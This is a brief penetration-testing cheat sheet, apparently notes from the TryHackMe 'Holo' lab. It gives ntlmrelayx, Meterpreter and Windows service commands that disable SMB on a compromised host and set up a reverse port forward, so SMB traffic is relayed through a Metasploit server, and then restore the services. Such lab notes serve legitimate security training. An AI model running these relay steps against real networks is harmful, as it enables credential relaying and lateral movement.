# Proxychains via Relaying

## 01 - Hijack Host and Setup MITM

Disable SMB to spoof the targets via proxychains

```
$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -socks

meterpreter > shell

C:\> sc stop netlogon

C:\> sc stop lanmanserver

C:\> sc config lanmanserver start=disabled

C:\> sc stop lanmanworkstation

C:\> sc config lanmanworkstation start=disabled

C:\> shutdown /r

C:\> exit
```

Add a reverse port forward to 445 to relay SMB attack via the command and control server (metasploit)

```
meterpreter > portfwd add -R -L <bind_target_IP> -l 445 -p 445
```

Revert back the settings.

```
meterpreter > shell

C:\> sc config lanmanserver start=auto

C:\> sc start lanmanworkstation

C:\> sc config lanmanworkstation start=auto

C:\> sc start netlogon
```

---
## References

- [Tryhackme: HOLO](https://stimpz0r.com/tryhackme-holo/)